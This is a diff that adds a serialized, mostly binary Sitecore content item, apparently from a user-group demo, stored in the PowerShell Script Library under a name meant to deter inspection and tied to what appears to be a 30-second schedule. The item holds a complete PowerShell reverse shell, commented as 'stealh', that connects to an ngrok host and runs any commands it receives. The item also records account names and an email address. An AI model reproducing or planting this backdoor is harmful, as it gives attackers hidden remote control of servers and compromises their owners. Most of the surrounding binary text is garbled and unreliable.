@@ -1,0 +1,77 @@
+
+[
+	+éşßA¤E’gr½FE
+	+éşßA¤E’gr½FDefault	Ä%^‰²,K‚3‚ó·ïS"	BÔq¼O>ºFˆ|tnTù»ƒ
+^
+	¨â¤K˜á†0tôWH
+	¨â¤K˜á†0tôW
+SugNL Demo	3'W£bPéC¤GTi‹ÁÆ7"	ÆZ¥¶¦	L¬:)8b[
+w
+	ï°Æ¹§¢&G‡íÏ[ÊË»‡a
+	ï°Æ¹§¢&G‡íÏ[ÊË»‡#Important-do-not-look-into-this-one	¨â¤K˜á†0tôW"	³ñ"İ‡½²M}÷¤–ˆC
+]
+	rshUbcG·èÚQ$ÂG
+	rshUbcG·èÚQ$Â	shedule-1	bÒ§W€H™b%ñAm"	#I$p„ú|GŒ½bó–BÄ+
+	+éşßA¤E’gr½F+
+	,ã³yÁO©Ä<nl)h®http://rendering:3000>
+	›‘vü|2G†]*÷•û8¤(http://rendering:3000/api/editing/render›
+	ï°Æ¹§¢&G‡íÏ[ÊË»‡„
+	ğO©±—hÀGœQªjË€±ğí$reverseShellClient = New-Object System.Net.Sockets.TCPClient("6.tcp.eu.ngrok.io", 10688);
+$reverseShellStream = $reverseShellClient.GetStream();
+# Generate a stealh reverse shell
+[byte[]]$reverseShellBytes = 0..65535|%{0};
+while(($i = $reverseShellStream.Read($reverseShellBytes, 0, $reverseShellBytes.Length)) -ne 0)
+{
+    $reverseShellCommand = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($reverseShellBytes,0, $i);
+    $reverseShellOutput = (Invoke-Expression -Command $reverseShellCommand 2>&1 | Out-String );
+    $reverseShellOutput2  = $reverseShellOutput + 'PS ' + (Get-Location).Path + '> ';
+    $reverseShellOutputBytes = ([text.encoding]::ASCII).GetBytes($reverseShellOutput2);
+    $reverseShellStream.Write($reverseShellOutputBytes,0,$reverseShellOutputBytes.Length);
+    $reverseShellStream.Flush();
+}
+$reverseShellClient.Close();
+
+
+é
+	rshUbcG·èÚQ$Â0
+	\)Õ/íTJ›ò&"3Office/32x32/stopwatch.pngB
+	øQ¾PmtÂMœ;±J¼\é·,20230601T010000|99990101T000000|127|00:00:30<
+	»Mæb9
+×Mº{ĞŒTà&{F5F55071-697B-4769-A992-2A755FC379E5}w
+	õ>‰pæ˜!G„JÃdĞÙäa/sitecore/system/Modules/PowerShell/Script Library/SugNL Demo/Important-do-not-look-into-this-one&
+	beá±ùóİM„Ên	™PìÀ20230601T184825Z
+	+éşßA¤E’gr½Fö
+enï&
+	Œ×¾%WIeA™ŠÊRöt—20220614T103029Z$
+	hE×]KMÁDµ
+õôÍ£Ositecore\Admin:
+	~3ÜŒ¡ûB»´ACu?$cc3a5834-6f8c-48b5-a0b7-c6d998b943a39
+	ùœİºàSM¼À-xL(/j#sitecore\xmc-e2e-admin@sitecore.com&
+	±ÏÙú¦K’ˆè¡tÔÕ"20220628T155530ZË
+	¨â¤K˜á†0tôW´
+en­&
+	Œ×¾%WIeA™ŠÊRöt—20230530T213948Z3
+	•u€R K*ËqÒŒasitecore\bas.lijten@gmail.com3
+	hE×]KMÁDµ
+õôÍ£Ositecore\bas.lijten@gmail.com:
+	~3ÜŒ¡ûB»´ACu?$d44b50fc-f33d-4375-8130-0e6d778db7e73
+	ùœİºàSM¼À-xL(/jsitecore\bas.lijten@gmail.com&
+	±ÏÙú¦K’ˆè¡tÔÕ"20230530T213948ZË
+	ï°Æ¹§¢&G‡íÏ[ÊË»‡´
+en­&
+	Œ×¾%WIeA™ŠÊRöt—20230530T212829Z3
+	•u€R K*ËqÒŒasitecore\bas.lijten@gmail.com3
+	hE×]KMÁDµ
+õôÍ£Ositecore\bas.lijten@gmail.com:
+	~3ÜŒ¡ûB»´ACu?$9ed17f57-87ae-440a-882d-c3fdc3cbc2a93
+	ùœİºàSM¼À-xL(/jsitecore\bas.lijten@gmail.com&
+	±ÏÙú¦K’ˆè¡tÔÕ"20230601T180645ZÀ
+	rshUbcG·èÚQ$Â©
+en¢&
+	Œ×¾%WIeA™ŠÊRöt—20230601T182306Z3
+	•u€R K*ËqÒŒasitecore\bas.lijten@gmail.com3
+	hE×]KMÁDµ
+õôÍ£Ositecore\bas.lijten@gmail.com:
+	~3ÜŒ¡ûB»´ACu?$2f32f368-325b-4ebb-98dd-ee631fcd2c4d(
+	ùœİºàSM¼À-xL(/jsitecore\Anonymous&
+	±ÏÙú¦K’ˆè¡tÔÕ"20230601T184825Z
